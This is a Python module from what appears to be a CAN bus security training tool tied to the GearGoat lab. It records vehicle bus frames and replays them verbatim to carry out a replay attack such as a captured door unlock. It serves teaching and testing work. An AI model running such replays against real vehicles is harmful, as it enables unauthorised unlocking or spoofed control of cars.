"""
Replay attack: record real traffic (legit dashboard actions, or anything on
the bus) then play it back verbatim later -- the classic "capture a door
unlock, replay it whenever you want" CAN attack GearGoat's manual teaches
with can-utils. Here it's a first-class, UI-driven feature instead of a
terminal exercise.
"""

import time


class CaptureBuffer:
    """A named recording of (relative_time, arb_id, data) frames."""

    def __init__(self, name: str):
        self.name = name
        self.frames: list[tuple[float, int, bytes]] = []
        self._recording = False
        self._start_time = 0.0

    def start(self) -> None:
        self.frames = []
        self._start_time = time.time()
        self._recording = True

    def stop(self) -> None:
        self._recording = False

    def on_frame(self, arb_id: int, data: bytes, timestamp: float) -> None:
        if not self._recording:
            return
        self.frames.append((time.time() - self._start_time, arb_id, bytes(data)))

    def to_dict(self) -> dict:
        return {"name": self.name, "frame_count": len(self.frames)}


def run_replay(attack, bus, capture: CaptureBuffer) -> None:
    loop = attack.params.get("loop", False)
    speed = max(0.05, float(attack.params.get("speed", 1.0)))

    if not capture.frames:
        attack.log(f"capture '{capture.name}' is empty, nothing to replay")
        return

    attack.log(f"replaying {len(capture.frames)} frames from '{capture.name}' (speed x{speed})")

    while not attack.stop_event.is_set():
        prev_t = 0.0
        for rel_t, arb_id, data in capture.frames:
            if attack.stop_event.is_set():
                return
            delay = (rel_t - prev_t) / speed
            if delay > 0:
                attack.stop_event.wait(delay)
            prev_t = rel_t
            bus.send(arb_id, data)
            attack.note_frame(arb_id, data)
        if not loop:
            break
    attack.log("replay finished")
